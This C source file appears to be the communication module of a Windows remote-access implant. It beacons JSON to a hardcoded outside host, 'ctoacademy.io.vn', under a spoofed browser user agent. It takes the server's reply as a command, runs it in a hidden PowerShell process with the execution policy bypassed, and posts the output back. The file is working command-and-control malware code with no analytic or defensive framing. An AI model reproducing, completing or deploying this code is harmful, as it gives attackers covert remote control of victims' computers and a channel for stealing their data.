#include "communication.h"

char currentDirectory[MAX_PATH] = { 0 };
WCHAR url[MAX_PATH] = L"ctoacademy.io.vn";
WCHAR sysinfoPath[MAX_PATH] = { 0 };
WCHAR beaconPath[MAX_PATH] = { 0 };
WCHAR resultPath[MAX_PATH] = { 0 };
WCHAR locationPath[MAX_PATH] = { 0 };
VOID InitCurDir() {
	MessageBox(NULL, L"Get the current directory:", L"Alert", MB_OK);
	if (!GetCurrentDirectoryA(MAX_PATH, currentDirectory)) {
		strncpy_s(currentDirectory, sizeof(currentDirectory), "C:\\", _TRUNCATE);
		MessageBoxA(NULL, currentDirectory, "Alert", MB_OK);
	}
}
BOOL SendJson(const char* jsonData, const WCHAR* url, const WCHAR* beaconingPath, const WCHAR* resultPath) {
	HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
	BOOL success = FALSE;

	// establish WinINet
	hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (!hInternet) {
		InternetCloseHandle(hInternet);
		return success;
	}

	// set timeout for connection (10s)
	DWORD timeout = 10000;
	InternetSetOptionW(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
	InternetSetOptionW(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
	InternetSetOptionW(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

	 //connect to server through HTTPS (port 443 = INTERNET_DEFAULT_HTTPS_PORT, change later)
	hConnect = InternetConnectW(hInternet, url, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		InternetCloseHandle(hInternet);
		return success;
	}

	// create https post request INTERNET_FLAG_SECURE later!!
	hRequest = HttpOpenRequestW(hConnect, L"POST", beaconingPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
	if (!hRequest) {
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return success;
	}

	// add headers
	const WCHAR* headers = L"Content-Type: application/json\r\n";
	if (!HttpAddRequestHeadersW(hRequest, headers, wcslen(headers), HTTP_ADDREQ_FLAG_ADD)) {
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return success;
	}

	// send JSON data
	DWORD dataLen = strlen(jsonData);
	if (HttpSendRequestW(hRequest, NULL, 0, (LPVOID)jsonData, dataLen)) {
		// get status code 
		DWORD statusCode = 0;
		DWORD statusCodeSize = sizeof(statusCode);
		HttpQueryInfoW(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL);
		
		// if status code == 200, get resposne and handle it
		if (statusCode == 200) {
			char cmd[1024] = { 0 };
			char buffer[1024] = { 0 };
			DWORD bytesRead = 0;
			DWORD totalBytes = 0;

			while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
				buffer[bytesRead] = '\0';
				strncat_s(cmd, sizeof(cmd), buffer, bytesRead);
				totalBytes += bytesRead;
			}
			MessageBoxA(NULL, cmd, "response", MB_OK);
			char result[4096] = { 0 };
			if (ExecuteCommand(cmd, result, sizeof(result))) {
				SendResultToServer(cmd, result, url, resultPath);
			}
		}
		success = TRUE;
	}
	return success;
}
// cd or Set-Location
BOOL HandleSetLocationCommand(const char* command, char* result, DWORD resultSize) {
	if (_strnicmp(command, "cd ", 3) == 0 || _strnicmp(command, "Set-Location ", 13) == 0) {
		const char* path = NULL;
		if (_strnicmp(command, "cd ", 3) == 0) {
			path = command + 3;
		}
		else {
			path = command + 13;
		}
		while (*path == ' ' || *path == '\t') path++;

		if (*path == '\0') {
			strncpy_s(result, resultSize, currentDirectory, _TRUNCATE);
			return TRUE;
		}

		// change current directory
		char newDir[MAX_PATH];
		if (SetCurrentDirectoryA(path)) {
			GetCurrentDirectoryA(MAX_PATH, newDir);
			strncpy_s(currentDirectory, sizeof(currentDirectory), newDir, _TRUNCATE);
			strncpy_s(result, resultSize, newDir, _TRUNCATE);

			char locationJson[MAX_PATH * 2] = { 0 };
			char escapedCurDir[MAX_PATH] = { 0 };
			EscapeJsonString(currentDirectory, escapedCurDir, sizeof(escapedCurDir));
			snprintf(locationJson, sizeof(locationJson), "{\
\"current_directory\":\"%s\" \
}", escapedCurDir);
			SendJson(locationJson, url, locationPath);
		}
		else {
			strncpy_s(result, resultSize, "Failed to change directory", _TRUNCATE);
		}
		return TRUE;
	}
	else if (_strnicmp(command, "cd", 2) == 0 || _strnicmp(command, "Set-Location", 12) == 0) {
		strncpy_s(result, resultSize, currentDirectory, _TRUNCATE);
		return TRUE;
	}
	return FALSE;
}

// execute the command and get the result through pipe
BOOL ExecuteCommand(const char* command, char* result, DWORD resultSize) {
	
	if (HandleSetLocationCommand(command, result, resultSize)) {
		return TRUE;
	}
	
	HANDLE hReadPipe = NULL, hWritePipe = NULL;
	SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
		return FALSE;

	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;

	char psCommand[1024];
	sprintf_s(psCommand, sizeof(psCommand), "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"%s\"", command);

	BOOL success = CreateProcessA(NULL, psCommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (!success) {
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		return FALSE;
	}

	CloseHandle(hWritePipe);

	DWORD bytesRead = 0;
	DWORD totalBytes = 0;
	while (ReadFile(hReadPipe, result + totalBytes, resultSize - totalBytes - 1, &bytesRead, NULL) && bytesRead > 0) {
		totalBytes += bytesRead;
	}
	result[totalBytes] = '\0';

	CloseHandle(hReadPipe);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return TRUE;
}

BOOL SendResultToServer(const char* command, const char* result, const WCHAR* url, const WCHAR* resultPath) {
	HINTERNET hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet) return FALSE;

	// using https later
	HINTERNET hConnect = InternetConnectW(hInternet, url, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		InternetCloseHandle(hInternet);
		return FALSE;
	}

	//HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", resultPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
	HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", resultPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
	if (!hRequest) {
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}

	const WCHAR* headers = L"Content-Type: application/json\r\n";
	HttpAddRequestHeadersW(hRequest, headers, wcslen(headers), HTTP_ADDREQ_FLAG_ADD);

	char resultJson[4096], escapedResult[4096], escapedCommand[1024];
	EscapeJsonString(result, escapedResult, sizeof(escapedResult));
	EscapeJsonString(command, escapedCommand, sizeof(escapedCommand));
	if (strcmp(escapedResult,"") == 0) strcpy_s(escapedResult, sizeof(escapedResult), "Done!!!");;
	MessageBoxA(NULL, escapedResult, "caption", MB_OK);
	sprintf_s(resultJson, sizeof(resultJson), "{\"command\": \"%s\", \"result\": \"%s\"}", escapedCommand, escapedResult);

	BOOL success = HttpSendRequestW(hRequest, NULL, 0, (LPVOID)resultJson, strlen(resultJson));

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	return success;
}